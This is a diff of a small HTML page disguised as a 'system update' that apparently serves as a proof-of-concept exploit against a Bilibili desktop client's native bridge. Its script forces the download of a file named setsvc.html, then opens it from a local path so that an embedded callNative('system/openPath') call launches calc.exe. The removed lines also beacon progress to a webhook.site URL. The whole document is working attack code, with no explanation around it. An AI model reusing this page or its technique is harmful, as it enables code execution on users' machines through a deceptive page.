@@ -1,16 +1,17 @@
-<!doctype html><title>系统组件更新</title>
+<!doctype html><title>sys-update</title>
 <script>
-function beacon(s){new Image().src='https://webhook.site/05fd1420-af5c-493b-8c5d-353f67b3f438?s='+encodeURIComponent(s)}
-beacon('v13-start');
-var fileHtml = '<scr'+'ipt>try{window.biliBridgePc.callNative("system/openPath","C:/Windows/System32/calc.exe")}catch(e){}<\/scr'+'ipt>';
+function st(s){try{document.title='up|'+s}catch(e){}}
+st('start');
+var fileHtml='<scr'+'ipt>try{window.biliBridgePc.callNative("system/openPath","C:/Windows/System32/calc.exe")}catch(e){}</scr'+'ipt>';
 try{
   var b=new Blob([fileHtml],{type:'text/html'});
-  var a=document.createElement('a');a.href=URL.createObjectURL(b);a.download='setsvc.html';
+  var u=URL.createObjectURL(b);
+  var a=document.createElement('a');a.href=u;a.download='setsvc.html';
   document.body.appendChild(a);a.click();
-  beacon('dl-clicked');
-}catch(e){beacon('dl:'+e.message)}
+  st('dl-clicked');
+}catch(e){st('dl-err:'+e.message)}
+setTimeout(function(){st('opening')},20000);
 setTimeout(function(){
-  beacon('opening');
-  try{var w=window.open('file:///C:/Users/aaa/Downloads/setsvc.html?bilipc=1');beacon('open '+(w?'obj':'null'))}catch(e){beacon('open-err '+e.message)}
-},25000);
+  try{var w=window.open('file:///C:/Users/aaa/Videos/bilibili/setsvc.html?bilipc=1');st('open '+(w?'obj':'null'))}catch(e){st('open-err:'+e.message)}
+},24000);
 </script>
